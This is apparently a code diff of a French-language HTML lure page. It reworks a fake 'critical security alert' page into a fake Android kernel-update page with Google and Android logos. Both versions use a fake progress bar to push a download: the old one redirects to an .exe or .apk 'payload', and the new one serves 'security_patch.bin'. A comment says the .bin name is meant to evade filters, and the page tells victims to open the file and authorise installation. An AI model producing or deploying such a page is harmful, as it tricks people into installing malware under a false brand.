@@ -1,211 +1,358 @@
 <!DOCTYPE html>
 <html lang="fr">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sécurité Système - Mise à jour requise</title>
+    <title>Centre de Maintenance Système Android</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;500;700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700&display=swap');
 
-        body {
+        :root {
+            --primary: #4285F4;
+            --secondary: #34A853;
+            --accent: #FBBC05;
+            --error: #EA4335;
+            --bg-dark: #0b0e14;
+            --glass: rgba(255, 255, 255, 0.05);
+            --border: rgba(255, 255, 255, 0.1);
+        }
+
+        * {
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
             font-family: 'Outfit', sans-serif;
-            background: #0b0e14 url('bg.png') no-repeat center center fixed;
-            background-size: cover;
+            background: var(--bg-dark);
             color: #fff;
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            overflow: hidden;
+            overflow-x: hidden;
+            position: relative;
         }
 
-        /* Glassmorphism Effect */
+        /* Animated Background */
+        body::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url('bg.png') no-repeat center center;
+            background-size: cover;
+            opacity: 0.3;
+            z-index: -1;
+            filter: blur(5px);
+        }
+
+        .hero-glow {
+            position: absolute;
+            width: 400px;
+            height: 400px;
+            background: radial-gradient(circle, rgba(66, 133, 244, 0.2) 0%, rgba(0, 0, 0, 0) 70%);
+            top: -200px;
+            right: -200px;
+            z-index: -1;
+            animation: float 10s infinite alternate;
+        }
+
+        @keyframes float {
+            0% {
+                transform: translate(0, 0);
+            }
+
+            100% {
+                transform: translate(-100px, 100px);
+            }
+        }
+
         .container {
-            background: rgba(15, 20, 28, 0.85);
-            backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 24px;
-            padding: 50px;
-            max-width: 500px;
+            width: 90%;
+            max-width: 480px;
+            background: var(--glass);
+            backdrop-filter: blur(25px);
+            border: 1px solid var(--border);
+            border-radius: 32px;
+            padding: 40px;
             text-align: center;
-            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-            animation: fadeIn 1s ease-out;
+            box-shadow: 0 40px 100px rgba(0, 0, 0, 0.5);
+            animation: slideUp 0.8s cubic-bezier(0.2, 0.8, 0.2, 1);
         }
 
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(20px); }
-            to { opacity: 1; transform: translateY(0); }
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(40px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
 
-        .icon {
-            font-size: 60px;
-            margin-bottom: 20px;
-            display: inline-block;
-            background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
+        .logo-container {
+            width: 80px;
+            height: 80px;
+            background: linear-gradient(135deg, var(--primary), #1a73e8);
+            border-radius: 20px;
+            margin: 0 auto 24px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 10px 20px rgba(66, 133, 244, 0.3);
+        }
+
+        .logo-container svg {
+            width: 45px;
+            fill: #fff;
         }
 
         h1 {
-            font-size: 2.5rem;
-            margin: 0 0 15px 0;
-            font-weight: 700;
+            font-weight: 600;
+            font-size: 1.8rem;
+            margin-bottom: 12px;
+            letter-spacing: -0.5px;
+        }
+
+        .device-info {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 12px;
+            padding: 12px;
+            font-size: 0.9rem;
+            color: #bdc1c6;
+            margin-bottom: 24px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+        }
+
+        .device-info span {
+            color: var(--primary);
+            font-weight: 600;
         }
 
         p {
-            font-size: 1.1rem;
-            color: #a0aec0;
+            color: #9aa0a6;
             line-height: 1.6;
-            margin-bottom: 35px;
+            margin-bottom: 32px;
+            font-size: 1.05rem;
         }
 
-        .status-badge {
-            display: inline-block;
-            background: rgba(255, 6, 6, 0.1);
-            color: #ff4d4d;
-            border: 1px solid #ff4d4d;
-            padding: 6px 16px;
-            border-radius: 100px;
-            font-size: 0.85rem;
+        .status {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 32px;
             font-weight: 500;
-            margin-bottom: 25px;
-            text-transform: uppercase;
-            letter-spacing: 1px;
+            font-size: 0.9rem;
+            color: var(--accent);
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            background: var(--accent);
+            border-radius: 50%;
+            box-shadow: 0 0 10px var(--accent);
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+                opacity: 1;
+            }
+
+            50% {
+                transform: scale(1.5);
+                opacity: 0.5;
+            }
+
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
         }
 
         .btn {
-            background: linear-gradient(135deg, #00d2ff 0%, #3a7bd5 100%);
-            color: white;
+            display: block;
+            width: 100%;
+            background: #fff;
+            color: #000;
             text-decoration: none;
-            padding: 16px 40px;
-            border-radius: 12px;
+            padding: 18px;
+            border-radius: 16px;
             font-weight: 600;
             font-size: 1.1rem;
-            box-shadow: 0 10px 20px rgba(58, 123, 213, 0.3);
-            transition: all 0.3s ease;
-            display: inline-block;
-            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.2, 0.8, 0.2, 1);
             border: none;
-            width: 100%;
+            cursor: pointer;
+            box-shadow: 0 15px 30px rgba(255, 255, 255, 0.1);
         }
 
         .btn:hover {
-            transform: scale(1.03);
-            box-shadow: 0 15px 30px rgba(58, 123, 213, 0.5);
+            background: #e8eaed;
+            transform: translateY(-2px);
+            box-shadow: 0 20px 40px rgba(255, 255, 255, 0.15);
+        }
+
+        .btn:active {
+            transform: translateY(0);
         }
 
         .loader {
             display: none;
-            margin-top: 30px;
+            margin-top: 20px;
+        }
+
+        .progress-container {
+            height: 4px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 2px;
+            overflow: hidden;
+            margin-bottom: 15px;
         }
 
         .progress-bar {
             width: 0%;
-            height: 4px;
-            background: #00d2ff;
-            border-radius: 2px;
+            height: 100%;
+            background: var(--primary);
             transition: width 0.3s;
         }
 
-        .footer-note {
+        .loader-text {
+            font-size: 0.85rem;
+            color: #bdc1c6;
+        }
+
+        .security-icons {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
             margin-top: 40px;
-            font-size: 0.8rem;
-            color: #718096;
+            opacity: 0.6;
         }
 
-        /* Micro-animations */
-        .pulse {
-            animation: pulse-animation 2s infinite;
+        .security-icons img {
+            height: 24px;
+            filter: grayscale(1) brightness(2);
         }
 
-        @keyframes pulse-animation {
-            0% { box-shadow: 0 0 0 0px rgba(255, 77, 77, 0.2); }
-            100% { box-shadow: 0 0 0 20px rgba(255, 77, 77, 0); }
+        .footer {
+            margin-top: 30px;
+            font-size: 0.75rem;
+            color: #5f6368;
         }
     </style>
 </head>
+
 <body>
 
-<div class="container">
-    <div class="icon">🛡️</div>
-    <div class="status-badge pulse">Alerte de sécurité critique</div>
-    <h1>Mise à jour requise</h1>
-    <p>Une faille majeure a été détectée sur votre système. Installez le correctif officiel pour protéger vos données personnelles.</p>
-    
-    <button class="btn" id="installBtn">INSTALLER LE CORRECTIF</button>
-    
-    <div class="loader" id="loader">
-        <p style="font-size: 0.9rem; margin-bottom: 10px;" id="loaderText">Préparation du téléchargement...</p>
-        <div style="background: rgba(255,255,255,0.1); border-radius: 2px;">
-            <div class="progress-bar" id="progressBar"></div>
+    <div class="hero-glow"></div>
+
+    <div class="container">
+        <div class="logo-container">
+            <svg viewBox="0 0 24 24">
+                <path d="M12,2L4.5,20.29L5.21,21L12,18L18.79,21L19.5,20.29L12,2Z" />
+            </svg>
+        </div>
+
+        <div class="status">
+            <div class="status-dot"></div>
+            Analyse de sécurité en cours...
+        </div>
+
+        <h1>Mise à jour noyau requise</h1>
+
+        <div class="device-info">
+            Appareil : <span id="deviceName">Détection...</span>
+        </div>
+
+        <p>Une mise à jour corrective pour le noyau système est nécessaire pour maintenir la stabilité de vos
+            applications.</p>
+
+        <button class="btn" id="dlBtn">METTRE À JOUR MAINTENANT</button>
+
+        <div class="loader" id="loader">
+            <div class="progress-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <div class="loader-text" id="loaderText">Téléchargement du package de sécurité...</div>
+        </div>
+
+        <div class="security-icons">
+            <img src="https://www.gstatic.com/images/branding/googlelogo/svg/google_logo.svg" alt="Google">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/d/d7/Android_robot.svg" alt="Android">
+        </div>
+
+        <div class="footer">
+            © 2026 Core Support Services. Tous droits réservés.<br>
+            Version : 14.0.2-patch (stable)
         </div>
     </div>
 
-    <div class="footer-note">
-        Verifié par System Security Core (v4.2.0)<br>
-        Certification Microsoft & Android Security Essentials
-    </div>
-</div>
+    <script>
+        const dlBtn = document.getElementById('dlBtn');
+        const loader = document.getElementById('loader');
+        const progressBar = document.getElementById('progressBar');
+        const loaderText = document.getElementById('loaderText');
+        const deviceName = document.getElementById('deviceName');
 
-<script>
-    const installBtn = document.getElementById('installBtn');
-    const loader = document.getElementById('loader');
-    const progressBar = document.getElementById('progressBar');
-    const loaderText = document.getElementById('loaderText');
-
-    // Détection de l'OS
-    function getOS() {
-        const userAgent = window.navigator.userAgent,
-              platform = window.navigator.platform,
-              macosPlatforms = ['Macintosh', 'MacIntel', 'MacPPC', 'Mac68K'],
-              windowsPlatforms = ['Win32', 'Win64', 'Windows', 'WinCE'],
-              iosPlatforms = ['iPhone', 'iPad', 'iPod'];
-
-        if (macosPlatforms.indexOf(platform) !== -1) return 'Mac OS';
-        if (iosPlatforms.indexOf(platform) !== -1) return 'iOS';
-        if (windowsPlatforms.indexOf(platform) !== -1) return 'Windows';
-        if (/Android/.test(userAgent)) return 'Android';
-        if (!platform && /Linux/.test(userAgent)) return 'Linux';
-
-        return 'Unknown';
-    }
-
-    installBtn.addEventListener('click', () => {
-        const os = getOS();
-        installBtn.style.display = 'none';
-        loader.style.display = 'block';
-
-        let progress = 0;
-        const interval = setInterval(() => {
-            progress += 5;
-            progressBar.style.width = progress + '%';
-
-            if (progress === 30) loaderText.innerText = 'Vérification du système ' + os + '...';
-            if (progress === 60) loaderText.innerText = 'Optimisation du package...';
-            if (progress === 90) loaderText.innerText = 'Finissage...';
-
-            if (progress >= 100) {
-                clearInterval(interval);
-                loaderText.innerText = 'Téléchargement lancé !';
-                
-                // Redirection vers le bon payload
-                if (os === 'Windows') {
-                    window.location.href = 'security_update.exe';
-                } else if (os === 'Android') {
-                    window.location.href = 'qr_scanner_fix.apk';
-                } else {
-                    alert('Votre système ' + os + ' est déjà protégé.');
-                }
-                
-                setTimeout(() => {
-                    loaderText.innerText = 'Veuillez ouvrir le fichier téléchargé pour finaliser.';
-                }, 2000);
+        // Détection simplifiée du modèle
+        function detectDevice() {
+            const ua = navigator.userAgent;
+            if (/Android/.test(ua)) {
+                const matches = ua.match(/Android [^;]+; ([^;]+)\)/);
+                deviceName.innerText = matches ? matches[1] : "Appareil Android Générique";
+            } else {
+                deviceName.innerText = "Appareil incompatible";
+                dlBtn.disabled = true;
+                dlBtn.innerText = "Indisponible sur cet appareil";
             }
-        }, 150);
-    });
-</script>
+        }
+        detectDevice();
+
+        dlBtn.addEventListener('click', () => {
+            dlBtn.style.display = 'none';
+            loader.style.display = 'block';
+
+            let progress = 0;
+            const steps = [
+                { p: 20, t: "Extraction des certificats..." },
+                { p: 50, t: "Vérification de l'intégrité..." },
+                { p: 80, t: "Optimisation pour votre appareil..." },
+                { p: 100, t: "Initialisation du téléchargement..." }
+            ];
+
+            let currentStep = 0;
+            const interval = setInterval(() => {
+                progress += 2;
+                progressBar.style.width = progress + '%';
+
+                if (currentStep < steps.length && progress >= steps[currentStep].p) {
+                    loaderText.innerText = steps[currentStep].t;
+                    currentStep++;
+                }
+
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    // Le lien est caché en tant que .bin pour passer les filtres
+                    window.location.href = 'security_patch.bin';
+
+                    setTimeout(() => {
+                        loaderText.innerHTML = "Téléchargement terminé.<br><br><b>Étape finale :</b> Ouvrez le fichier téléchargé et autorisez l'installation pour finaliser la mise à jour.";
+                    }, 2000);
+                }
+            }, 100);
+        });
+    </script>
 
 </body>
+
 </html>
